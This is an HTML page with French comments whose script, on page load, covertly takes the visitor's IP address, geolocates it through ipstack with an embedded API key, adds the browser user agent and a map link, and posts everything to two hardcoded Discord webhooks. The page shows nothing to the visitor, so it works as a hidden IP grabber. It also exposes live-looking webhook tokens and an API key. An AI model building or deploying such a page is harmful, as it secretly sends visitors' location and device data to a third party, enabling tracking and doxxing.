<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send IP to Discord Webhooks</title>
</head>
<body>
    <script>
        // Fonction pour envoyer les informations au premier webhook Discord
        function sendToFirstWebhook(ip, country, emoji, userAgent, city, latitude, longitude) {
            console.log("Sending data to first webhook...");

            try {
                // Créer une requête HTTP POST vers le premier webhook Discord
                var xhr = new XMLHttpRequest();
                var url = "https://discord.com/api/webhooks/1239641610959061034/CzNLDuIrSyz3qPcTdDGdhVmC64BTsua-xTYZCYrM_xKEmGju4DskvfSHaIZOqBVaig8A";
                xhr.open("POST", url);

                // Construire le lien géographique seulement si les données de latitude et de longitude sont disponibles
                var mapLink = "";
                if (latitude !== undefined && longitude !== undefined) {
                    mapLink = "https://www.openstreetmap.org/?mlat=" + latitude + "&mlon=" + longitude;
                    console.log("Map link: " + mapLink);
                }

                // Ajouter le contenu du message avec le lien géographique
                var params = JSON.stringify({ 
                    content: "🪑 Nouveau clic sur le site ! 🪑\n\nIP 🛰️ : " + ip + "\nPays : " + emoji + " " + country + "\nVille **approximative** 🏠 : " + city + "\nNavigateur / système d'exploitation ⚙️ : " + userAgent + (mapLink !== "" ? "\nLien géographique **approximative** : " + mapLink : "")
                });

                // Envoyer la requête
                xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
                xhr.send(params);
                console.log("Data sent to first webhook.");
            } catch (error) {
                console.error('Error sending data to first webhook:', error);
            }
        }

        // Fonction pour envoyer l'adresse IP au deuxième webhook Discord
        function sendToSecondWebhook(ip) {
            console.log("Sending data to second webhook...");

            try {
                // Créer une requête HTTP POST vers le deuxième webhook Discord
                var xhr = new XMLHttpRequest();
                var url = "https://discord.com/api/webhooks/1239655686984695878/VglgZ3_aLe8P8dKhKFwqz89Y5S4u97SWxOZn3IXpxc8cEZ14hGK_CUqqTyTMcihbFL48";
                xhr.open("POST", url);

                // Ajouter le contenu du message
                var params = JSON.stringify({ content: ip });

                // Envoyer la requête
                xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
                xhr.send(params);
                console.log("Data sent to second webhook.");
            } catch (error) {
                console.error('Error sending data to second webhook:', error);
            }
        }

        // Fonction pour récupérer les informations et les envoyer aux webhooks
        function collectAndSendInfo() {
            console.log("Collecting and sending information...");
            // Récupérer l'adresse IP du visiteur
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    console.log("IP retrieved: " + data.ip);
                    var ip = data.ip;

                    try {
                        // Récupérer les informations de géolocalisation avec ipstack
                        fetch('http://api.ipstack.com/' + ip + '?access_key=083c71c1ef029c06841336c4eed24ec6')
                            .then(response => response.json())
                            .then(data => {
                                console.log("Geolocation data retrieved:", data);
                                var city = data.city; 
                                var country = data.country_name;
                                var countryCode = data.country_code;
                                var emoji = getCountryEmoji(countryCode);
                                var userAgent = navigator.userAgent;
                                var latitude = data.latitude;
                                var longitude = data.longitude;

                                // Envoyer les informations au premier webhook Discord avec le lien géographique
                                sendToFirstWebhook(ip, country, emoji, userAgent, city, latitude, longitude);

                                // Envoyer l'adresse IP au deuxième webhook Discord
                                sendToSecondWebhook(ip);
                            })
                            .catch(error => {
                                console.error('Error fetching geolocation:', error);
                                throw error;
                            });
                    } catch (error) {
                        console.error('Error processing geolocation data:', error);
                    }
                })
                .catch(error => console.error('Error fetching IP:', error));
        }

        // Fonction pour récupérer l'emoji du drapeau du pays
        function getCountryEmoji(countryCode) {
            try {
                if (countryCode) {
                    var offset = 127397;
                    var countryCodeUppercase = countryCode.toUpperCase();
                    return String.fromCodePoint(...countryCodeUppercase.split('').map(c => c.charCodeAt() + offset));
                } else {
                    console.error('Error: Country code is undefined.');
                    return '';
                }
            } catch (error) {
                console.error('Error getting country emoji:', error);
                return '';
            }
        }

        // Appeler la fonction pour collecter et envoyer les informations lors du chargement de la page
        window.onload = collectAndSendInfo;
    </script>
</body>
